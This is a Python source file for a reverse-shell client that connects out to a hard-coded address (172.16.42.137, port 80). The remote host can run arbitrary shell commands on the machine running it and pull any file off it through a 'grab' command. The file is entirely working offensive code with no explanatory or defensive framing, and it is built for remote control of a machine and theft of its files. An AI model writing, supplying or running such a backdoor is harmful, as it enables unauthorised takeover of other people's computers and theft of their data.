import socket
import subprocess
import shlex
import os

HOST = "172.16.42.137"
PORT = 80

def execute(command):
    cmd = command.strip()
    if not cmd:
        return
    
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

def transfer(connection, path):
    if not os.path.exists(path):
        connection.send('File not found'.encode())
    
    with open(path, 'rb', errors="ignore") as f:
        packet = f.read(1024)

        while packet:
            connection.send(packet)
            packet = f.read(1024)
        
        connection.send('DONE'.encode())

def execute_command(s, cmd):
    output = execute(cmd)
    try:
        if output:
            s.send(output.encode())
        else:
            s.send('done'.encode())
    except BrokenPipeError as bpe:
        print('[-] Host disconnected')
        exit(1)
    except KeyboardInterrupt as ke:
        print('\n[+] Exiting ...')
        exit() 
    except Exception as e:
        print('[-] Connection Lost')
        exit()

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except ConnectionRefusedError as e:
        print('[-] Host is down')
        s.close()
        exit(1)
    except ConnectionAbortedError as e:
        print('[-] Host disconnected')
        s.close()
        exit(1)
    except Exception as e:
        print('[-] Connection closed')
        s.close()
        exit(1)
    
    while True:
        cmd = s.recv(4096)
        cmd = cmd.decode()

        if 'terminate' in cmd:
            s.close()
            break
        elif 'grab' in cmd:
            grab, path = cmd.split('*')
            transfer(s, path)
        else:
            execute_command(s, cmd)
        
def main():
    connect()

if __name__ == "__main__":
    main()